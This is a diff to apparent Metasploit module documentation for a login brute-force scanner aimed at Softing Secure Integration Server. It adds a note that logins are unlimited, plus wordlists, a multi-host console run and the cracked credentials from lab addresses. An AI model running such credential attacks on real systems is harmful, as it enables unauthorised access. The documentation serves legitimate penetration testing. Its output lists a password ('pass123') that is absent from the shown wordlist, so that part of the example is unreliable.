@@ -6,6 +6,8 @@ By default:
 * Credentials are `admin:admin`.
 * HTTP is TCP/8099 and HTTPS is TCP/443. Either one can be used, but the module defaults to TCP/8099.
 
+There does not seem to be a limit to the number of times login attempts can be made.
+
 ## Vulnerable Application
 
 This module was tested against version 1.22, installed on Windows Server 2019 Standard x64.
@@ -90,6 +92,84 @@ host            origin          service          public  private  realm  private
 ----            ------          -------          ------  -------  -----  ------------  ----------
 192.168.50.119  192.168.50.119  8099/tcp (http)  admin   admin           Password      
 192.168.50.119  192.168.50.119  443/tcp (https)  admin   admin123        Password      
+
+msf6 auxiliary(scanner/http/softing_sis_login) > 
+```
+
+### Several targets, using different usernames and passwords
+
+In this scenario, we have several targets that have different usernames and passwords for each.
+All the targets have the Softing Secure Integration Server login page enabled at TCP/8099.
+
+Contents of `usernames.txt`:
+```
+admin
+admin1
+user
+lowpriv
+guest
+```
+
+Contents of `passwords.txt`:
+```
+admin
+admin123
+BadPass
+GoodPass?
+P@ssw0rd
+user
+pass
+password
+lowpriv
+```
+
+Contents of `targets.txt`:
+```
+192.168.50.71
+192.168.50.119
+192.168.50.206
+```
+
+Module output:
+```
+msf6 > use auxiliary/scanner/http/softing_sis_login
+msf6 auxiliary(scanner/http/softing_sis_login) > set RHOSTS file:/home/ubuntu/Documents/targets.txt
+RHOSTS => file:/home/ubuntu/Documents/targets.txt
+msf6 auxiliary(scanner/http/softing_sis_login) > set USER_FILE ~/Documents/usernames.txt
+USER_FILE => ~/Documents/usernames.txt
+msf6 auxiliary(scanner/http/softing_sis_login) > set PASS_FILE ~/Documents/passwords.txt
+PASS_FILE => ~/Documents/passwords.txt
+msf6 auxiliary(scanner/http/softing_sis_login) > set VERBOSE false
+VERBOSE => false
+msf6 auxiliary(scanner/http/softing_sis_login) > run
+
+[+] 192.168.50.71:8099 - Success: 'admin:P@ssw0rd'
+[*] Scanned 1 of 3 hosts (33% complete)
+[+] 192.168.50.119:8099 - Success: 'admin:admin'
+[*] Scanned 2 of 3 hosts (66% complete)
+[+] 192.168.50.206:8099 - Success: 'admin:pass123'
+[+] 192.168.50.206:8099 - Success: 'admin1:admin123'
+[*] Scanned 3 of 3 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/softing_sis_login) > 
+```
+
+Note that `VERBOSE` was set to `false` in this scenario to reduce amount of output on screen.
+By default, `VERBOSE` is set to true, which also outputs failed login attempts.
+
+`creds` output:
+
+```
+msf6 auxiliary(scanner/http/softing_sis_login) > creds
+Credentials
+===========
+
+host            origin          service          public  private   realm  private_type  JtR Format
+----            ------          -------          ------  -------   -----  ------------  ----------
+192.168.50.71   192.168.50.71   8099/tcp (http)  admin   P@ssw0rd         Password      
+192.168.50.119  192.168.50.119  8099/tcp (http)  admin   admin            Password      
+192.168.50.206  192.168.50.206  8099/tcp (http)  admin   pass123          Password      
+192.168.50.206  192.168.50.206  8099/tcp (http)  admin1  admin123         Password      
 
 msf6 auxiliary(scanner/http/softing_sis_login) > 
 ```
